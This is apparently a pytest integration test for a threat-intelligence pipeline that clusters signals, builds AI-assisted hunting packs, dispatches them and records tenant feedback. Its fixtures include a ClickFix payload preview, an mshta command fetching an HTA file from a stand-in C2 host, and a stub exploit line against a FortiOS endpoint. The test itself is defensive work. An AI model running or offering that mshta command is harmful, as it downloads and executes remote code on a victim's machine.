"""End-to-end on PostgreSQL: signals -> clusters -> AI-assisted packs -> push dispatch -> pull API -> feedback."""

from __future__ import annotations

import os
from datetime import UTC, datetime, timedelta
from pathlib import Path

import httpx
import pytest
import yaml

pytestmark = pytest.mark.integration
if not os.environ.get("HC_TEST_DATABASE_URL"):
    pytest.skip("HC_TEST_DATABASE_URL not set", allow_module_level=True)

from alembic import command  # noqa: E402
from alembic.config import Config  # noqa: E402
from sqlalchemy import select  # noqa: E402

from app.api.main import create_app  # noqa: E402
from app.collectors.base import IntelSignal, Observable  # noqa: E402
from app.core.signing import build_signed_headers, canonical_json, verify_signature  # noqa: E402
from app.db.models import AiCompilation, HuntingPack, PivotedCluster  # noqa: E402
from app.db.session import build_engine, get_session, session_scope  # noqa: E402
from app.dispatch.dispatcher import deliver_due  # noqa: E402
from app.schemas.enums import AttackVector, DeliveryStatus, IntelSource  # noqa: E402
from app.schemas.manifest import TenantManifest  # noqa: E402
from app.services.ai_service import ai_tasks_for_cluster  # noqa: E402
from app.services.cluster_builder import cluster_pending_events  # noqa: E402
from app.services.intel_store import store_signals  # noqa: E402
from app.services.pack_builder import build_packs  # noqa: E402
from app.services.tenant_registry import upsert_tenant  # noqa: E402
from tests.fakes import FakeProvider, mshta_rule, synthetic_whitelist  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
PULL_SECRET, PULL_TOKEN, PUSH_SECRET = "p" * 40, "t" * 40, "q" * 40


@pytest.fixture(scope="module", autouse=True)
def migrated_db():
    cfg = Config(str(ROOT / "alembic.ini"))
    cfg.set_main_option("script_location", str(ROOT / "migrations"))
    command.downgrade(cfg, "base")
    command.upgrade(cfg, "head")
    yield
    command.downgrade(cfg, "base")


@pytest.fixture
async def engine():
    eng = build_engine(pooled=False)
    yield eng
    await eng.dispose()


def _push_manifest() -> TenantManifest:
    raw = yaml.safe_load((ROOT / "config/tenant_manifest.yaml").read_text(encoding="utf-8"))
    raw["tenant"] = {"slug": "acme-push", "display_name": "Acme"}
    raw["brand"] = {"domains": ["acme-corp.com.vn"], "keywords": ["acmecorp"]}
    raw["delivery"] = {"mode": "push", "webhook_url": "https://soar.acme-corp.com.vn/hook",
                       "secret_env": "HC_TENANT_ACME_HMAC_SECRET"}  # fmt: skip
    return TenantManifest.model_validate(raw)


def _signals(now: datetime) -> list[IntelSignal]:
    kev = IntelSignal(
        source=IntelSource.CISA_KEV, external_id="CVE-2026-1111", attack_vector=AttackVector.EDGE_DEVICE_EXPLOIT,
        title="CVE-2026-1111 Fortinet FortiOS", observed_at=now,
        raw_payload={"kev": {"cveID": "CVE-2026-1111", "vendorProject": "Fortinet", "product": "FortiOS"},
                     "epss": {"epss": 0.4, "percentile": 0.95}, "epss_alert": True,
                     "matched_tenants": {"tencongty": ["fortinet:fortios"]}, "nuclei_templates": [],
                     "pocs": [{"repo": "r/poc", "likely_fake": False,
                               "files": {"exploit.py": "requests.post(t + '/remote/hostcheck_validate')"}}]},
        observables=[Observable(type="cve", value="CVE-2026-1111")],
    )  # fmt: skip
    clickfix = IntelSignal(
        source=IntelSource.URLSCAN, external_id="scan-1", attack_vector=AttackVector.CLICKFIX_FILELESS,
        title="ClickFix lure on lure-site.com", observed_at=now,
        raw_payload={"lure_page": "https://lure-site.com/", "payload_previews": ["mshta https://c2.evil-cdn.com/x.hta"],
                     "unpack_layers": [{"depth": 0, "technique": "input"}, {"depth": 1, "technique": "encodedcommand"}]},
        observables=[Observable(type="domain", value="lure-site.com"), Observable(type="domain", value="c2.evil-cdn.com"),
                     Observable(type="domain", value="sso.tencongty.vn"), Observable(type="ip", value="104.16.5.5")],
    )  # fmt: skip
    return [kev, clickfix]


async def test_pipeline_end_to_end(engine):
    now = datetime.now(UTC)
    wl = synthetic_whitelist(tenant_domains=("tencongty.vn", "acme-corp.com.vn"))
    pull_manifest = TenantManifest.from_yaml_file(ROOT / "config/tenant_manifest.yaml")
    async with session_scope(engine) as s:
        pull_tenant, _ = await upsert_tenant(s, pull_manifest, webhook_secret=PULL_SECRET, api_token=PULL_TOKEN)
        push_tenant, _ = await upsert_tenant(s, _push_manifest(), webhook_secret=PUSH_SECRET, api_token=None)
        assert await store_signals(s, _signals(now)) == 2
        assert await store_signals(s, _signals(now)) == 0  # idempotent

    async with session_scope(engine) as s:
        assert await cluster_pending_events(s, wl, now=now + timedelta(minutes=31)) == 2
        v3 = await s.scalar(
            select(PivotedCluster).where(PivotedCluster.attack_vector == AttackVector.CLICKFIX_FILELESS)
        )
        assert v3.cluster_key == "v3:c2:c2.evil-cdn.com"
        assert v3.observables["domains_block"] == ["c2.evil-cdn.com", "lure-site.com"]
        assert "sso.tencongty.vn" not in str(v3.observables) and "104.16.5.5" not in str(v3.observables)
        assert v3.base_confidence == 70

    provider = FakeProvider({"summary": "mshta-based ClickFix", "rules": [mshta_rule()]})
    async with session_scope(engine) as s:

        async def ai(cluster):
            return await ai_tasks_for_cluster(s, cluster, provider, wl, enabled_vectors={v.value for v in AttackVector})

        assert await build_packs(s, ai_tasks=ai, now=now) == 4  # 2 clusters x 2 tenants (both run FortiOS)
        audits = {a.status for a in (await s.scalars(select(AiCompilation))).all()}
        assert audits == {"accepted", "rejected"}  # V2 rejects the C2 indicator foreign to that cluster
        seen_by_model = "\n".join(c["user"] for c in provider.calls)
        assert "tencongty" not in seen_by_model and "acme" not in seen_by_model
    calls_before = len(provider.calls)
    async with session_scope(engine) as s:

        async def ai2(cluster):
            return await ai_tasks_for_cluster(s, cluster, provider, wl, enabled_vectors={v.value for v in AttackVector})

        assert await build_packs(s, ai_tasks=ai2, now=now + timedelta(minutes=10)) == 0  # no re-issue on drift
    assert len(provider.calls) == calls_before  # cached

    # --- push dispatch -----------------------------------------------------------------------------
    received: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        verify_signature(PUSH_SECRET, request.content, request.headers["X-HuntCompiler-Signature"],
                         request.headers["X-HuntCompiler-Timestamp"])  # fmt: skip
        received.append(request)
        return httpx.Response(500 if len(received) == 1 else 200)

    async with session_scope(engine) as s, httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        counts = await deliver_due(s, client, now=now)
        assert counts["delivered"] == 1 and counts["retrying"] == 1
    async with session_scope(engine) as s, httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        assert (await deliver_due(s, client, now=now + timedelta(hours=2)))["delivered"] == 1
        statuses = (
            await s.scalars(select(HuntingPack.delivery_status).where(HuntingPack.tenant_id == push_tenant.id))
        ).all()
        assert set(statuses) == {DeliveryStatus.DELIVERED}

    # --- pull API + feedback -------------------------------------------------------------------------
    app = create_app()

    async def _session():
        async with session_scope(engine) as s:
            yield s

    app.dependency_overrides[get_session] = _session
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://hc") as api:
        assert (await api.get("/api/v1/packs")).status_code == 401
        page = (await api.get("/api/v1/packs", headers={"Authorization": f"Bearer {PULL_TOKEN}"})).json()
        assert len(page["items"]) == 2
        for item in page["items"]:
            verify_signature(PULL_SECRET, canonical_json(item["pack"]), item["signature"], str(item["timestamp"]))
        empty = (await api.get(f"/api/v1/packs?after={page['next_cursor']}",
                               headers={"Authorization": f"Bearer {PULL_TOKEN}"})).json()  # fmt: skip
        assert empty["items"] == []

        pack_id = next(i["pack"]["pack_id"] for i in page["items"] if i["pack"]["attack_vector"] == "clickfix_fileless")
        body = canonical_json({"pack_id": pack_id, "sighting": True, "evaluable": True,
                               "evaluated_at": now.isoformat()})  # fmt: skip
        headers = build_signed_headers(PULL_SECRET, body, tenant_slug="tencongty")
        assert (await api.post("/api/v1/feedback", content=body, headers=headers)).json() == {"status": "recorded"}
        assert (await api.post("/api/v1/feedback", content=body, headers=headers)).json() == {"status": "duplicate"}
        bad = dict(headers, **{"X-HuntCompiler-Signature": "sha256=" + "0" * 64})
        assert (await api.post("/api/v1/feedback", content=body, headers=bad)).status_code == 401

    async with session_scope(engine) as s:
        v3 = await s.scalar(
            select(PivotedCluster).where(PivotedCluster.attack_vector == AttackVector.CLICKFIX_FILELESS)
        )
        assert v3.sighting_count == 1
        assert pull_tenant.slug == "tencongty"
